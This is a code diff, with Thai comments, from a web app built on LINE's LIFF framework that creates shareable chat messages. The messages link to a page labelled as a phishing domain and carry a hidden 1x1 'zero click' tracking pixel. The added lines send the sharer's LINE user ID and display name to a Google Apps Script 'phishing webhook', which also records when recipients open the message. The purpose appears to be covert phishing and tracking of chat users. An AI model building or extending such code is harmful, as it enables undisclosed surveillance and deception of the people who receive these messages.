@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbx_I2m7FG8ooUBKyXvwCt1usxxFT3ORX8EDqNy3hXJsfKMKPFbWky5Zk0FWWy0wTTQU8A/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGkaXFCBxIuyO9oEBBDFFnbNWtm8S0meqjObC6fX9dGVdiVZf4-VQS9ZqcK6yB0IqC-Q/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -820,8 +820,12 @@
                 // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
                 
-                // สร้าง URL สำหรับ Zero Click tracking (ใช้รูป 1x1 pixel สำหรับติดตามเมื่อเปิดดูข้อความ)
-                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}`;
+                // สร้าง URL สำหรับ Zero Click tracking ให้มีข้อมูลเพียงพอสำหรับการติดตาม
+                // เพิ่มพารามิเตอร์ userId เพื่อระบุผู้สร้าง และ random เพื่อป้องกันการแคช
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                const zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
+                
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
                 // สร้างข้อความแชร์ (Flex Message) พร้อมระบบ Zero Click
                 const message = {
@@ -840,7 +844,7 @@
                                 uri: clickTrackUrl
                             }
                         },
-                        // เพิ่ม footer สำหรับใส่ tracking pixel (1x1 pixel transparent)
+                        // ปรับปรุง footer สำหรับใส่ tracking pixel (1x1 pixel transparent)
                         footer: {
                             type: 'box',
                             layout: 'vertical',
@@ -848,14 +852,18 @@
                                 {
                                     type: 'image',
                                     url: zeroClickTrackUrl,
-                                    size: '1px',
+                                    size: '1px', // กำหนดขนาดเล็กที่สุด
                                     aspectRatio: '1:1',
                                     aspectMode: 'cover'
+                                },
+                                // เพิ่ม spacer เพื่อให้มีพื้นที่แสดง (สำคัญ)
+                                {
+                                    type: 'spacer',
+                                    size: 'xs'
                                 }
                             ],
                             spacing: 'none',
-                            margin: 'none',
-                            height: '1px'
+                            margin: 'none'
                         }
                     }
                 };
